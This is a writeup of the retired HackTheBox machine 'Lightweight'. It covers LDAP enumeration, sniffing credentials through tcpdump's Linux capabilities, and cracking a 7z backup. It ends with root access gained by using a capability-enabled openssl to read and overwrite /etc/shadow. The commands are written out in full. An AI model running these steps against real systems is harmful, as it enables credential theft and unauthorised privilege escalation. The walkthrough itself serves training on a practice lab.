---
title: Lightweight Hackthebox Writeup
date: 2021-02-26 07:00:00 +0530
categories: [Hackthebox, Retired]
tags: [linux,posix capabilites,ssh,ldapsearch,ldapenumeration,openssl,tcpdump]     # TAG names should always be lowercase
image: /assets/img/lightweight-hackthebox/lightweight-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Lightweight:~$


Column | Details
------------ | -------------
Name | Lightweight
IP | 10.10.10.119
Points | 30
Os | Linux
Difficult | Medium
Creator | [0xEA31](https://www.hackthebox.eu/home/users/profile/13340)
Out on | 8th December 2018

# Summary:~$

* Discovering the new host and scanning for open ports.
* Exploring the `website` and loging into ssh with least priveleges.
* Escalating privileges to another user i.e `ldapuser2` by exploiting **POSIX** capabilities for *tcpdump*.
* Cracking a backup file to escalate privileges to another user i.e `ldapuser2`
* Escalating privileges to `root` by exploiting **POSIX** capabilities for *openssl*.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/lightweight-hackthebox/nmap-automator-1.png)

Let's access `Port 80` first.

___
![](/assets/img/lightweight-hackthebox/port-80-2.png)

I used `dirbuster` to check for *hidden directories*.

___
![](/assets/img/lightweight-hackthebox/dirbuster-start-3.png)

As we have seen port *389* i.e for `ldap port`. Let's use `ldapsearch` to enumerate the port.

**Command**: *ldapsearch -x -h 10.10.10.119 -D '' -w '' -b "dc=lightweight,dc=htb"*

___
![](/assets/img/lightweight-hackthebox/ldapsearch-command-5.png)

I found `2 Users` and their hashes.

___
![](/assets/img/lightweight-hackthebox/ldapsearch-users-password-6.png)

**Details**:

`Username`: ldapuser1

`Password`:e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2Roai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv

`Hash Password`: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/

`Username`: ldapuser2

`Password`:e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x

`Hash Password`: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1

I tried using `John` to crack the hashes but it didn't work out.

___
![](/assets/img/lightweight-hackthebox/john-processing-7.png)

**Command**: *john --wordlist=/usr/share/wordlists/rockyou.txt hashes*

After that I checked port 80 thoroughly and found `http://10.10.10.119/info.php` and `http://10.10.10.119/user.php`.

___
![](/assets/img/lightweight-hackthebox/port-80-info-php-8.png)

___
![](/assets/img/lightweight-hackthebox/checking-user-php-9.png)

Let's login into `ssh` with the given credentials.

**Command**: *ssh 10.10.14.14@10.10.10.119* **and** *password: 10.10.14.14*

We don't have permissions to access `ldapuser1` and `ldapuser2`.

___
![](/assets/img/lightweight-hackthebox/permission-denied-ldapuser-11.png)

Let's use `LinEnum.sh` to escalate privileges.

___
![](/assets/img/lightweight-hackthebox/sending-linpeas=-sh-12.png)

**Command**: *wget http://10.10.14.14:8081/linpeas.sh* 

**Command**: *python3 -m http.server 8081*

Ran LinEnum.sh after giving executing permissions using *chmod +x linpeas.sh* and found this

___
![](/assets/img/lightweight-hackthebox/posix-capabilities-13.png)

Read about [Linux Capabilities](https://linux-audit.com/linux-capabilities-101/).

`/usr/sbin/tcpdump` = *cap_net_admin,cap_net_raw+ep*

**cap_net_admin**:

___
![](/assets/img/lightweight-hackthebox/cap-net-admin-14.png)

**cap_net_raw+ep**:

___
![](/assets/img/lightweight-hackthebox/cap-net-raw-15.png)

The `+ep` at the end stands for adding the capability as Effective and Permitted.

`e`: Effective --> This means the capability is “activated”.

`p`: Permitted --> This means the capability can be used/is allowed.

This means we can run TCP dump on any of the port using this capability, let's try to get the password of LDAP user using it.

**Command to run on local machine**: *ssh 10.10.14.14@10.10.10.119 /usr/sbin/tcpdump -i any -U -w - 'not port 22' > tcpdump.cap*

___
![](/assets/img/lightweight-hackthebox/tcp-dump-command-16.png)

Now Go to `10.10.10.119` and visit `user;info;status` pages, this is because our account is being created and we will view the intercepted traffic using wireshark.

Opening **tcpdump.cap** file on wireshark and let's check `LDAP` Protocol.

___
![](/assets/img/lightweight-hackthebox/got-ldapuser2-password-17.png)

Got `Password` for *ldapuser2* as `8bc8251332abe1d7f105d3e53ad39ac2`.

Logging in as `ldapuser2`.

___
![](/assets/img/lightweight-hackthebox/su-ldapuser2-18.png)

Got `User` Flag.

In `ldapuser2`, I found a backup file called *backup.7z*.

___
![](/assets/img/lightweight-hackthebox/backup-7a-19.png)

Let's download it to our local machine using `scp`.

**Command**: *scp 10.10.14.14@10.10.10.119:/home/ldapuser2/backup.7z /home/pulkittalwar2611/Pictures/lightweight-htb/backup.7z*

It shows `permission denied` now let's `base64` encode it and then transfer it.

**Command**: *cat backup.7z | base64*

___
![](/assets/img/lightweight-hackthebox/base64-encode-20.png)

Creating a file called `backup.7z.base64` and saving it there.

Now decoding it on our local machine --> *cat backup.7z.base64 PIPE base64 --decode > backup.7z*

Now let's use `7z2john.pl` to convert it and then crack the password of the file using `john`.

**Command**: */usr/share/john/7z2john.pl backup.7z > backup_file*

Installing dependencies: *apt install libcompress-raw-lzma-perl*

**John Command**: *john --wordlist=/usr/share/wordlists/rockyou.txt backup_file*

___
![](/assets/img/lightweight-hackthebox/7z2john-21.png)

Got password as `delete`, After accessing it and we found **4 Files**.

___
![](/assets/img/lightweight-hackthebox/we-got-4-files-22.png)

Accessing these files we got **password** for `ldapuser1` as `f3ca9d298a553da117442deeb6fa932d`.

___
![](/assets/img/lightweight-hackthebox/ldapuser1-passord-23.png)

Switching to `ldapuser1`.

___
![](/assets/img/lightweight-hackthebox/su-ldapuser1-24.png)

Files in `ldapuser1` directory.

___
![](/assets/img/lightweight-hackthebox/files-in-ldapuser1-25.png)

Now let's use `LinEnum.sh` again to escalate privileges.

___
![](/assets/img/lightweight-hackthebox/downloading-linenum-ldapuser1-26.png)

**Command**: *wget http://10.10.14.14:8081/linpeas.sh* 

**Command**: *python3 -m http.server 8081*

Ran LinEnum.sh after giving executing permissions using *chmod +x linpeas.sh* and found this

___
![](/assets/img/lightweight-hackthebox/posix-capabilities-27.png)

We have `ep permissions` on `openssl` i.e **effective and permitted**.

Read this regarding [Escalating Privileges using openssl](https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

Reading the `/etc/shadow` : **/home/ldapuser1/openssl enc -in "/etc/shadow"**

___
![](/assets/img/lightweight-hackthebox/read-etc-shadow-28.png)

Generating a `hash` with the password as **password**. (*-1: uses the MD5 based BSD password algorithm 1*)

___
![](/assets/img/lightweight-hackthebox/creating-password-29.png)

Creating a new shadow file and copy all the data of `/etc/shadow` to it and replace the root hash by the new hash created i.e. `$1$1Mo8wQD9$k2OI6vD05Drc6xPwfayLA.`

___
![](/assets/img/lightweight-hackthebox/shadow-created-30.png)

Replacing new shadow file in `/etc/shadow` using *openssl commands* --> **/home/ldapuser1/openssl enc -in shadow -out /etc/shadow**

Using `su root` and enter password i.e `password`.

___
![](/assets/img/lightweight-hackthebox/root-31.png)

Got Root.